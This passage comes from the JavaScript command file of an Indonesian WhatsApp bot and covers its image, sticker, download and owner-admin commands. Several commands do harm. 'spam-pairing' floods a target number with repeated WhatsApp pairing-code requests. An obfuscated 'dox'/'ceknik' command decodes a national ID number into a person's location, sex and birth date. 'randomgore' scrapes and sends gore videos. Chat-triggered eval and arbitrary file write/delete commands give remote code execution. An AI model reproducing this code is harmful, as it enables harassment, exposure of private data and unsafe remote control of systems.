let buf = await getBuffer(`https://tolol.ibnux.com/img.php?nama=${q}`)
xyu.sendMessage(m.chat, { image: buf, caption: `done` }, { quoted: m})
}
break

//===============================================================================

case 'quote': {
  try {
    if (!q) return reply(`contoh\n\nquote dingin tapi tidak mematikan`);
// wm avs
    const { createCanvas, loadImage } = require('canvas');
    const fs = require('fs');
    const path = require('path');
// wm avs
    const canvasWidth = 800;
    const canvasHeight = 400;
    const canvas = createCanvas(canvasWidth, canvasHeight);
    const ctx = canvas.getContext('2d');
// wm avs
    ctx.fillStyle = '#ffffff'; //serah kalian kalau mau ubah warna
    ctx.fillRect(0, 0, canvasWidth, canvasHeight);
// wm avs
    ctx.fillStyle = '#000000';
    ctx.font = 'bold 32px Arial';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
// wm avs
    const words = q.split(' ');
    const lines = [];
    let currentLine = '';
// wm avs    
    words.forEach(word => {
      const testLine = currentLine + word + ' ';
      const testWidth = ctx.measureText(testLine).width;
      if (testWidth > canvasWidth - 40) {
        lines.push(currentLine);
        currentLine = word + ' ';
      } else {
        currentLine = testLine;
      }
    });
    lines.push(currentLine);
// wm avs
    const lineHeight = 40;
    const textY = (canvasHeight - (lines.length * lineHeight)) / 2;
// wm avs
    lines.forEach((line, index) => {
      ctx.fillText(line.trim(), canvasWidth / 2, textY + (index * lineHeight));
    });
// wm avs
    const outputPath = path.join(__dirname, 'quote.png');
    const out = fs.createWriteStream(outputPath);
    const stream = canvas.createPNGStream();
    stream.pipe(out);
// wm avs
    out.on('finish', async () => {
      await xyu.sendMessage(from, { image: { url: outputPath }, caption: '_done nih_.', fileName: 'quote.png' }, { quoted: m });
      fs.unlinkSync(outputPath);
    });
// wm avs
} catch (err) {
    console.error(err);
    reply('error bntar.');
  }
}
break


//===============================================================================
case 'spam-pairing': case 'spam': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break

case 'gantifile': {
if (!isCreator) return
if (!text.includes("./")) return reply(`Contoh: ${prefix+command} ./package.json`); 
let dir = path.dirname(text);
let fileName = path.basename(text);
if (!fs.existsSync(dir)) {
return reply('Direktori tidak ditemukan!');
}
let files = fs.readdirSync(dir);
if (!files.includes(fileName)) {
return reply('Tidak dapat menemukan file!');
}
let media = await downloadContentFromMessage(m.quoted, "document");
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}

fs.writeFileSync(text, buffer);
reply(`Mengupload file...`);
await sleep(2000);
reply(`Berhasil mengupload ${fileName}`);
}
break

case 'upsw': {
				if (!isCreator) return m.reply(mess.owner)
				const statusJidList = Object.keys(db.users)
				const backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
				if (quoted.isMedia) {
					if (/image|video/.test(quoted.mime)) {
						await xyu.sendMessage('status@broadcast', {
							[`${quoted.mime.split('/')[0]}`]: await quoted.download(),
							caption: text || m.quoted?.body || ''
						}, { statusJidList })
						xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
					} else if (/audio/.test(quoted.mime)) {
						await xyu.sendMessage('status@broadcast', {
							audio: await quoted.download(),
							mimetype: 'audio/mp4',
							ptt: true
						}, { backgroundColor, statusJidList })
						xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
					} else m.reply('Only Support video/audio/image/text')
				} else if (quoted.text) {
					await xyu.sendMessage('status@broadcast', { text: text || m.quoted?.body || '' }, {
						textArgb: 0xffffffff,
						font: Math.floor(Math.random() * 9),
						backgroundColor, statusJidList
					})
					xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
				} else m.reply('Only Support video/audio/image/text')
			}
			break

case 'mediafire': case 'mf': {
 if (!text) return reply(`*Example:* ${prefix}${command} https://www.mediafire.com/file/941xczxhn27qbby/GBWA_V12.25FF-By.SamMods-.apk/file`);
 
 try {
 const response = await fetch(`https://restapi.apibotwa.biz.id/api/mediafire?url=${encodeURIComponent(text)}`);
 const json = await response.json();
 
 if (!json.data.response) return reply('Failed to fetch!');
 
 const { download, filename, size, type, uploaded, mimetype } = json.data.response;
 
 let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${type}
*📨 Uploaded:* ${uploaded}
`.trim();
 
 m.reply(caption);
 
 await xyu.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: verif });
 
 } catch (error) {
 throw error
 }
};
break

case 'addcase': {
if (!isCreator) return reply("khusus Xyuraa")
    if (!q) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'case.js';
const caseBaru = `${q}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan!');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break

//================================================================================

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//================================================================================

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//================================================================================

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await xyu.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break


//================================================================================

case "developerbot": case "owner": case "creator":{
await xyu.sendContact(m.chat, [global.owner], m)
xyu.sendMessage(m.chat, {audio: fs.readFileSync('./src/mp3/owner.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})     
}
break

//===============================================================================

case 'gcbot':{
var link = "https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR"
reply(link)
}
break

//================================================================================

case "save": case "sv": {
if (!isCreator) return
await xyu.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//================================================================================

case "public": {
if (!isCreator) return
xyu.public = true
m.reply("succes ke mode *public* 🔵")
}
break

//================================================================================


case "self": {
if (!isCreator) return
xyu.public = false
m.reply("succes ke mode *self* 🔴")
}
break



//================================================================================


case 'getcase': {
    const getCase = (cases) => {
        return "case " + `'${cases}'` + fs.readFileSync("./case.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
    };
    try {
        if (!isCreator) return m.reply(mess.owner);
        if (!q) return m.reply(`contoh : ${prefix + command} antilink`);
        let nana = await getCase(q);
        m.reply(nana);
    } catch (err) {
        console.log(err);
        m.reply(`Case ${q} tidak di temukan`);
    }
}
break;

//================================================================================

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Core
*• Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*• Respon Speed :* ${latensi.toFixed(4)} detik
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//================================================================================


case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//===============================================================================

case 'brat3': {
  if (!text) return reply(`Penggunaan : ${prefix + command} <teks>`);
  try {
    const { createCanvas, registerFont } = require('canvas');
    const Jimp = require('jimp');
    registerFont('./lib/arialnarrow.ttf', { family: 'ArialNarrow' });
 const canvas = createCanvas(512, 512);
 const ctx = canvas.getContext('2d');
 ctx.fillStyle = '#ffffff';
 ctx.fillRect(0, 0, canvas.width, canvas.height);
 const findOptimalFontSize = (text, maxWidth, maxHeight) => {
 let fontSize = 65;
 ctx.font = `bold ${fontSize}px ArialNarrow`;
 const words = text.split(' ');
 let lines = [];
 while (fontSize > 0) {
 lines = [];
 let currentLine = [];
 let currentWidth = 0;
 ctx.font = `bold ${fontSize}px ArialNarrow`;
 for (const word of words) {
 const wordWidth = ctx.measureText(word + ' ').width;
 if (currentWidth + wordWidth <= maxWidth) {
 currentLine.push(word);
 currentWidth += wordWidth;
 } else {
 if (currentLine.length > 0) {
 lines.push(currentLine);
 }
 currentLine = [word];
 currentWidth = wordWidth;
 }
 }
 if (currentLine.length > 0) {
 lines.push(currentLine);
 }

 const totalHeight = lines.length * (fontSize + 10);
 if (totalHeight <= maxHeight) {
 break;
 }
 fontSize -= 2;
 }
 return { fontSize, lines };
 };
 const padding = 40;
 const maxWidth = canvas.width - (padding * 2);
 const maxHeight = canvas.height - (padding * 2);
 const { fontSize, lines } = findOptimalFontSize(q, maxWidth, maxHeight);
 ctx.fillStyle = '#000000';
 ctx.font = `bold ${fontSize}px ArialNarrow`;
 const lineHeight = fontSize + 10;
 const totalHeight = lines.length * lineHeight;
 const startY = (canvas.height - totalHeight) / 2 + fontSize / 2;
 lines.forEach((line, i) => {
 if (line.length === 1) {
   ctx.textAlign = 'left';
   ctx.fillText(line.join(' '), padding, startY + (i * lineHeight));
 } else {
   const totalSpacing = maxWidth - line.reduce((acc, word) => acc + ctx.measureText(word).width, 0);
   const spaceBetween = line.length > 1 ? totalSpacing / (line.length - 1) : 0;
   
   let currentX = padding;
   line.forEach((word, j) => {
     ctx.fillText(word, currentX, startY + (i * lineHeight));
     currentX += ctx.measureText(word).width + spaceBetween;
   });
 }
 });
const buffer = canvas.toBuffer();
let image = await Jimp.read(buffer);

image.blur(2);
let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
    
    await xyu.imgToSticker(m.chat, blurredBuffer, m, { packname: "Created By Xyuraa"})

  } catch (e) {
    console.log(e);
    await reply(`Terjadi kesalahan saat membuat stiker`);
  }
}
break


//===============================================================================
case "ocr":{
let q = m?.quoted ? m?.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await xyu.downloadAndSaveMediaMessage(q)
let url = await uploadToCatbox(img)
let hasil = await ocrapi.ocrSpace(url)
 await reply(hasil.ParsedResults[0].ParsedText)
}
break

//===============================================================================

case 'gdrive': {
		if (!args[0]) return m.reply(`Silakan Masukan Link gdrive Anda`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await m.reply(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	xyu.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	m.reply('Error: Silakan Cek Link gdrive Anda 🗿') 
  }
}
break
//===============================================================================

case 'dox': case 'ceknik': {
 if (!isCreator) return m.reply(mess.owner); //by moraxs inc
const _0x1ad75f = _0x1d50;
(function (_0x5722d4, _0x5d79c5) {
    const _0x419fb2 = _0x1d50, _0x4594e3 = _0x5722d4();
    while (!![]) {
        try {
            const _0x5287ce = parseInt(_0x419fb2(0x1ba)) / (0x182b + 0x2331 + -0x3b5b * 0x1) + parseInt(_0x419fb2(0x1bb)) / (-0xcbf * -0x1 + -0x1d20 + -0x5 * -0x347) * (parseInt(_0x419fb2(0x1a4)) / (0x14d8 + 0x1 * 0xae5 + -0x83 * 0x3e)) + -parseInt(_0x419fb2(0x1bf)) / (-0xd * 0x10d + 0x304 * -0x1 + 0x10b1) + parseInt(_0x419fb2(0x1ae)) / (-0x145 * -0x1 + -0x1 * 0x226 + 0xe6) * (-parseInt(_0x419fb2(0x1b3)) / (-0x1 * 0x1091 + 0x888 + 0x80f * 0x1)) + parseInt(_0x419fb2(0x1a8)) / (0xc92 + -0x607 * -0x5 + -0x2aae) * (-parseInt(_0x419fb2(0x199)) / (0x2 * -0x12b9 + -0x1190 * 0x1 + 0x370a)) + parseInt(_0x419fb2(0x1bc)) / (-0x25dc + -0xb92 * 0x3 + 0x489b) + parseInt(_0x419fb2(0x1a3)) / (-0x66 * 0x1c + -0xf5b + 0x1a8d);
            if (_0x5287ce === _0x5d79c5)
                break;
            else
                _0x4594e3['push'](_0x4594e3['shift']());
        } catch (_0x4e059b) {
            _0x4594e3['push'](_0x4594e3['shift']());
        }
    }
}(_0x5367, -0x5ff + -0x12 * 0x88f9 + 0x13 * 0xe253));
if (!isCreator)
    return;
if (!q)
    return reply(_0x1ad75f(0x1c9) + '\x20' + (prefix + command) + (_0x1ad75f(0x198) + _0x1ad75f(0x1a5)));
function _0x1d50(_0x3c301c, _0x131a9c) {
    const _0x5e5a9a = _0x5367();
    return _0x1d50 = function (_0x1e5abf, _0xd89f17) {
        _0x1e5abf = _0x1e5abf - (-0x951 * -0x1 + -0x53 * 0x2 + -0xc * 0x97);
        let _0x1a89ba = _0x5e5a9a[_0x1e5abf];
        return _0x1a89ba;
    }, _0x1d50(_0x3c301c, _0x131a9c);
}
nik = q[_0x1ad75f(0x1aa)]();
const moraxs = require(_0x1ad75f(0x1c0) + _0x1ad75f(0x1c7) + _0x1ad75f(0x1a1)), white = new Date()[_0x1ad75f(0x1b4) + 'r']()[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1b2)](-(-0x1ca1 * 0x1 + 0x983 + 0x1320)), green = nik[_0x1ad75f(0x1c2)](0x1 * -0x1a0e + 0x1399 + -0x67f * -0x1, -0x665 + 0x90e + 0x3 * -0xdf), yellow = nik[_0x1ad75f(0x1c2)](-0xbf1 + 0x1af * -0x12 + 0xe17 * 0x3, 0xd * -0x10a + -0x1466 + 0x21f0);
function _0x5367() {
    const _0x495ec9 = [
        '\x0aLahir:\x20',
        '\x0aKecamatan',
        '251772mkKAbJ',
        './lib/getd',
        'D:\x20',
        'substring',
        '\x0aProvince:',
        'length',
        '0|10|9|11|',
        '\x0aNama\x20Kabu',
        'ata/wilaya',
        'igit',
        '*Example*:',
        'split',
        '\x203216728xx',
        '1040LAXXul',
        '\x0aKelamin:\x20',
        'Perempuan',
        'kabkot',
        '4|2|5',
        'harus\x2016\x20d',
        '8|7|6|1|3|',
        '\x0aKode\x20Pos:',
        'h.json',
        '\x0aProvice\x20I',
        '12351070HwEtZc',
        '33NRugLl',
        'xxxxx',
        'Laki-laki',
        '\x0aKabupaten',
        '50309UGiCCa',
        '[\x20CEKNIK\x20BY_XYURA',
        'toString',
        'Nomor\x20NIK\x20',
        'matan:\x20',
        'slice',
        '137235iFAOFQ',
        '\x20--\x20',
        '\x20ID:\x20',
        'provinsi',
        'substr',
        '114OBnjVf',
        'getFullYea',
        '\x0aNama\x20Keca',
        '\x0aUniqcode:',
        'paten:\x20',
        'kecamatan',
        '\x20]\x0a\x0aNik:\x20',
        '708334MZIFmC',
        '1000yrrSlg',
        '341469uKBskL'
    ];
    _0x5367 = function () {
        return _0x495ec9;
    };
    return _0x5367();
}
if (nik[_0x1ad75f(0x1c4)] == -0x18cf + 0x3 * -0x943 + 0x34a8) {
    const xhYroT = (_0x1ad75f(0x1c5) + _0x1ad75f(0x19f) + _0x1ad75f(0x19d))[_0x1ad75f(0x197)]('|');
    let hoQumn = 0x2 * -0x2d1 + -0x1ca9 + 0x224b;
    while (!![]) {
        switch (xhYroT[hoQumn++]) {
        case '0':
            provinceid = nik[_0x1ad75f(0x1c2)](-0x186f + 0x26a * -0x1 + 0x1ad9, -0x11 * 0x151 + 0x3 * -0x7f5 + 0x2e42);
            continue;
        case '1':
            kelamin = yellow > -0xd40 + 0x1045 + 0x2dd * -0x1 ? _0x1ad75f(0x19b) : _0x1ad75f(0x1a6);
            continue;
        case '2':
            V = green < white ? '20' + green : '19' + green;
            continue;
        case '3':
            lahir = yellow > 0x1 * -0x1c68 + -0xa * -0x17 + 0x1baa ? (yellow - (-0x950 + 0x248 + 0x5c * 0x14))[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1c4)] > -0x5 * -0x301 + 0xe30 + 0xe * -0x216 ? (yellow - (-0x2137 + 0x173 * -0x13 + 0x3ce8))[_0x1ad75f(0x1aa)]() : '0' + (yellow - (-0x1d8 * -0x4 + -0xbf7 + 0x4bf))[_0x1ad75f(0x1aa)]() : yellow;
            continue;
        case '4':
            X = nik[_0x1ad75f(0x1c2)](0x19e5 + -0xdf7 + -0x5f3 * 0x2, -0xb * 0x28d + -0x1fe8 * 0x1 + -0x3c01 * -0x1);
            continue;
        case '5':
            Z = nik[_0x1ad75f(0x1c2)](-0xeb * -0x1b + 0xbad + -0x246a, 0x1202 + -0x2055 + 0xe63);
            continue;
        case '6':
            kodepos = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x1ad3 + -0x1468 + -0x66b, 0x524 + -0x1b7f + -0x151 * -0x11)][_0x1ad75f(0x1ad)](-(-0xb2 * -0xc + -0xd * -0x225 + 0x121a * -0x2));
            continue;
        case '7':
            kecamatan = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x163a + -0x242a + 0xdf0, 0x11 * -0x41 + -0xf7f * 0x1 + 0x13d6)][_0x1ad75f(0x197)](_0x1ad75f(0x1af))[0x1e9e + 0x399 + 0x13 * -0x1cd];
            continue;
        case '8':
            kecamatanId = nik[_0x1ad75f(0x1c2)](-0x2 * -0xe13 + 0x2431 + 0x931 * -0x7, 0x1e26 + 0x38e + 0x1 * -0x21ae);
            continue;
        case '9':
            kabupatenKotaId = nik[_0x1ad75f(0x1c2)](0x6 * -0x115 + 0xed * -0x4 + 0xa32, -0x192c + -0x1 * -0x189 + 0x17a7);
            continue;
        case '10':
            province = moraxs[_0x1ad75f(0x1b1)][nik[_0x1ad75f(0x1c2)](-0x649 * 0x1 + 0x5d9 * -0x1 + -0x1 * -0xc22, 0x1f04 + 0x92f * 0x3 + -0x3a8f * 0x1)];
            continue;
        case '11':
            kabupatenKota = moraxs[_0x1ad75f(0x19c)][nik[_0x1ad75f(0x1c2)](0x8c5 + -0x280 + -0x645, -0x1ea5 + -0x1 * 0xb0f + 0x14dc * 0x2)];
            continue;
        }
        break;
    }
} else
    return reply(_0x1ad75f(0x1ab) + _0x1ad75f(0x19e) + _0x1ad75f(0x1c8));
await sleep(-0x240b * -0x1 + 0x1e3f + -0x3692), reply(_0x1ad75f(0x1a9) + _0x1ad75f(0x1b9) + q + (_0x1ad75f(0x1a2) + _0x1ad75f(0x1c1)) + provinceid + (_0x1ad75f(0x1c3) + '\x20') + province + (_0x1ad75f(0x1a7) + _0x1ad75f(0x1b0)) + kabupatenKotaId + (_0x1ad75f(0x1c6) + _0x1ad75f(0x1b7)) + kabupatenKota + (_0x1ad75f(0x1be) + _0x1ad75f(0x1b0)) + kecamatanId + (_0x1ad75f(0x1b5) + _0x1ad75f(0x1ac)) + kecamatan + (_0x1ad75f(0x1a0) + '\x20') + kodepos + _0x1ad75f(0x19a) + kelamin + _0x1ad75f(0x1bd) + lahir + '/' + X + '/' + V + (_0x1ad75f(0x1b6) + '\x20') + Z);
}
break

//===============================================================================

case 'stich': case 'caristc': case 'stc': case 'stickersearch': {
if (!q) return reply('contoh: .stickersearch kucing') 
async function stickersearch(query){
return new Promise((resolve) => {
axios.get(`https://getstickerpack.com/stickers?query=${query}`).then(({ data }) => {
const $ = cheerio.load(data)
const link = [];
$('#stickerPacks > div > div:nth-child(3) > div > a').each(function(a, b) {
link.push($(b).attr('href'))
})
let rand = link[Math.floor(Math.random() * link.length)]
axios.get(rand).then(({data}) => {
const $$ = cheerio.load(data)
const url = [];
//wm senn
$$('#stickerPack > div > div.row > div > img').each(function(a, b) {
url.push($$(b).attr('src').split('&d=')[0])
})
resolve({
title: $$('#intro > div > div > h1').text(),
author: $$('#intro > div > div > h5 > a').text(),
author_link: $$('#intro > div > div > h5 > a').attr('href'),
sticker: url
})
//wm senn
})
})
})
}
//wm senn
if (!text) return reply(`Ex : ${prefix + command} kucing`);
//wm senn
const anu = await stickersearch(text);
//wm senn
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 5);
//wm senn
if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await xyu.sendImageAsSticker(m.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
//wm senn
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
//wm senn
}
}}
//wm senn
break

case 'randomgore': case 'gore': {
function gore() {
	return new Promise((resolve, reject) => {
		const page = Math.floor(Math.random() * 228)
		axios.get('https://seegore.com/gore/page/' + page)
			.then((res) => {
				const $ = cheerio.load(res.data)
				const link = [];
				$('ul > li > article').each(function(a, b) {
					link.push({
						title: $(b).find('div.content > header > h2').text(),
						link: $(b).find('div.post-thumbnail > a').attr('href'),
						thumb: $(b).find('div.post-thumbnail > a > div > img').attr('src'),
						view: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-views').text(),
						vote: $(b).find('div.post-thumbnail > div.post-meta.bb-post-meta.post-meta-bg > span.post-meta-item.post-votes').text(),
						tag: $(b).find('div.content > header > div > div.bb-cat-links').text(),
						comment: $(b).find('div.content > header > div > div.post-meta.bb-post-meta > a').text()
					})
				})
				const random = link[Math.floor(Math.random() * link.length)]
				axios.get(random.link)
					.then((resu) => {
						const $$ = cheerio.load(resu.data)
						const hasel = {}
						hasel.title = random.title
						hasel.source = random.link
						hasel.thumb = random.thumb
						hasel.tag = $$('div.site-main > div > header > div > div > p').text()
						hasel.upload = $$('div.site-main').find('span.auth-posted-on > time:nth-child(2)').text()
						hasel.author = $$('div.site-main').find('span.auth-name.mf-hide > a').text()
						hasel.comment = random.comment
						hasel.vote = random.vote
						hasel.view = $$('div.site-main').find('span.post-meta-item.post-views.s-post-views.size-lg > span.count').text()
						hasel.video1 = $$('div.site-main').find('video > source').attr('src')
						hasel.video2 = $$('div.site-main').find('video > a').attr('href')
						resolve(hasel)
					})
			})
	})
}
let letme = await gore()
let hiy = `[ *RANDOM GORE* ]

Title: ${letme.title}
Source: ${letme.source}
Tag: ${letme.tag}
Upload: ${letme.upload}
Author: ${letme.author}
Comment: ${letme.comment}
Vote: ${letme.vote}
Views: ${letme.view}
`
await xyu.sendMessage(m.chat, { video: { url: letme.video1 }, caption: hiy }, { quoted: m })
}
break


//===============================================================================
case 'sendsc': {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply('Kutip pesan seseorang!')
edit2("Memproses pengiriman...", "Script berhasil terkirim!")
let a = getTime().split("T")[1].split("+")[0]
let t = q.split(' ');
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let d = (await xyu.onWhatsApp(u.split`@`[0]))[0] || {}
var name = `Takashi-Botz` // Gak bisa pakai spasi !
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await xyu.sendMessage(u, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break
//===============================================================================
case "delfile":
if (!isCreator) return 
if (!text) return reply("Ex: .delfile ./database/prem.json")
fs.unlinkSync(text)
reply ("Done")
break
//===============================================================================

case 'addfile': {
    if (!isCreator) return
    if (!text.includes("./")) return reply(`Contoh: ${prefix + command} ./path/to/file.txt`);
    
    let filePath = path.resolve(text);
    let dir = path.dirname(filePath);
    let fileName = path.basename(filePath);
    
    if (!fs.existsSync(dir)) {
        return reply('Direktori tidak ditemukan!');
    }
    
    // Pastikan pesan yang dikutip berisi dokumen
    if (!m.quoted) {
        return reply('Tidak ada file yang dikutip!');
    }

    try {
        let media = await downloadContentFromMessage(m.quoted, "document");
        let buffer = Buffer.from([]);
        
        for await (const chunk of media) {
            buffer = Buffer.concat([buffer, chunk]); // Gunakan let agar buffer bisa diubah
        }

        if (fs.existsSync(filePath)) {
            fs.appendFileSync(filePath, buffer);
            reply(`Berhasil menambahkan konten ke ${fileName}`);
        } else {
            fs.writeFileSync(filePath, buffer);
            reply(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
        }
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengunduh atau menyimpan file.');
    }
}
break
//================================================================================

case "getsc": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Takashi-Botz`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await xyu.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//================================================================================

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

//================================================================================

case "clearchat": case "clc": {
if (!isCreator) return Reply(mess.owner)
xyu.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.timestamp }]}, m.chat)
}
break

//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xyu.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

//================================================================================

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//================================================================================
if ((m.mtype === 'groupInviteMessage' || m.text.startsWith('Undangan untuk bergabung') || m.text.startsWith('Invitation to join') || m.text.startsWith('Buka tautan ini')) && !m.isBaileys && !m.isGroup) {
await xyu.sendMessage(m.chat, {react: {text: `🤨`,key: m?.key,}})
let teks = 'group apa itu'
m.reply(teks)
}

